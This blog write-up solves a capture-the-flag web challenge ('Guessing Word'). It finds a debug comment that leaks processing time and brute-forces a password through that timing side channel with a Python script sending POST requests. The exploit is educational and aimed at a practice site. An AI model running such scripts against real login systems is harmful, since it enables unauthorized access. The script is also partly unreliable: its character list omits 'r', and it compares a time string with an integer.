---
title: "[Writeup] ROP: 05 - Guessing Word"
date: 2020-03-17T22:00:00+07:00
categories: [writeup]
tags: [rop, web, ctf, writeup]
---

**DISCLAIMER: game.rop.sh was discontinued and is no longer available.**

**Challenge Name:** Guessing Word  
**Type:** Web  
**Score:** 200 pts  
**Link:** [https://game.rop.sh](https://game.rop.sh/task)  

{{< img src="/images/rop/05/rop_05_challenge.png" alt="Challenge Description">}}*Guessing Word challenge description*

<!--more-->

As usual, the challenge provides us with a link to the website. On the website, there's a text box and a button to submit the password that we need to "GUESS".

{{< img src="/images/rop/05/rop_05_webpage.png" alt="Challenge Webpage">}}*Webpage of the challenge*

Looking at the page source, we would see this:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="../../docs-assets/ico/favicon.png">

    <title>Guessing Game</title>

    <!-- Bootstrap core CSS -->
    <link href="../../css/bootstrap.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="signin.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy this line! -->
    <!--[if lt IE 9]><script src="../../docs-assets/js/ie8-responsive-file-warning.js"></script><![endif]-->

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>

    <div class="container">
      <form class="form-signin" role="form" action="index.php" method="POST">
        <h3 class="form-signin-heading">Can you guess my password?</h3>
        <input type="password" class="form-control" placeholder="Password" name="password" required><br>
        <button class="btn btn-lg btn-primary btn-block" type="submit">Enter</button>
        <!-- ?debug for DEBUGGING -->
      </form>
    </div> <!-- /container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
  </body>
</html>
```

We can see that the form would send a POST request with the password in the textbox to **index.php**.
So let's try inputting *test* into the form and press *Enter*.

{{< img src="/images/rop/05/rop_05_wrong.png" alt="Result">}}*Result*

Apparently, we guessed wrong. Let's see the source.

```html
Wrong Password<br>
```

... Really? That's it? The whole source is just one line, without any comment as a hint at all.
We need to do something with the input of the form, one of the possibilities would be SQL Injection, but let's look at the source of the first page again, maybe we could find something.

```html
...
        <button class="btn btn-lg btn-primary btn-block" type="submit">Enter</button>
        <!-- ?debug for DEBUGGING -->
      </form>
...
```

Hmmm...? **?debug for DEBUGGING**? Let's try it then, changing the target of the POST request to **index.php?debug** and submit again.

{{< img src="/images/rop/05/rop_05_wrong.png" alt="Debug Result">}}*Result with ?debug*

The page looks the same; however, something interesting appears in the source.

```
Wrong Password<br><br><!-- Process Time: 0 -->
```

A comment telling us the process time! After several tries, we have found out that different inputs yield different processing times, and we can deduct the correct password from the processing time.

The code would probably look somewhat like this:

```py
correct_pass = "P@ssw0rd"
input = [User input]

wrong = False

# Different input sizes yield equal processing time, so it is probably made to be easy to crack.
for i in range (0, min(len(correct_pass), len(input))):
  if correct_pass[i] != input[i]:
    wrong = True
    break

if len(correct_pass) != len(input):
  wrong = True

if !wrong:
  print("Correct Password")
else:
  print("Wrong Password")
```

With this code, the program would run longer if more characters of the input matches the correct password. Therefore, we can bruteforce it character by character and pick the one with the longest processing time.

I wrote a simple Python script to send POST requests and bruteforce the password.

```py
import requests
import re

url = "https://game.rop.sh/chall/5/index.php?debug"
  
password = ""
charlist = "0123456789abcdefghijklmnopqustuvwxyz!@#$%^&*()_-+="

for i in range(30):
    maxtime = 0
    tempchar = ''
    end = False
    for c in charlist:
        temppass = password + c
        data = {'password':temppass}
        r = requests.post(url = url, data = {"password":temppass})
        
        wrong = re.search('Wrong', r.text)
        if not wrong:
            tempchar = c
            end = True
            break

        find = re.search('Process Time: ([\d\.]+)', r.text)
        if find:
            time = find.group(1)
            if time > maxtime:
                maxtime = time
                tempchar = c
    password = password + tempchar
    print(password)
    if end:
        break

print("Key = " + password)
```

The script would rotate the characters from the list to send as an input, after that, it would save the one with the longest process time and pick the further characters.

After waiting for a while, we got our password.

{{< img src="/images/rop/05/rop_05_output.png" alt="Script Output">}}*Script Output*

Inputting this key manually on the website yields this result:

{{< img src="/images/rop/05/rop_05_key.png" alt="Result">}}*Result*

Success!